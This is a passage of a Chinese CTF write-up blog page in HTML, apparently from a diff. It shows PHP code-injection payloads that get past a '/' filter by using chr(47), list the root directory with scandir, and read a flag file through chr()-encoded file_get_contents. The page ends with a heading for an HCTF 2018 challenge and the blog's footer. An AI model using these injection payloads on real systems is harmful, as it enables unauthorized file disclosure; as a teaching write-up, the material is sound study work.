+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/fdsvdfgrth.png" alt="fdsvdfgrth"></p>
+<p>扫描根目录下的文件，但是/被过滤了，可以用chr(47)绕过，47是/的ascii码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num&#x3D;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703191256119.png" alt="image-20200703191256119"></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/vdfvrtyhg.png" alt="vdfvrtyhg"></p>
+<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2>
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/ctf/"># ctf</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/06/27/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%9C%9F%E6%9C%AB/">网络设备期末</a>
+            
+            
+            <a class="next" rel="next" href="/2020/04/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">渗透测试学习笔记</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© FXXY | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
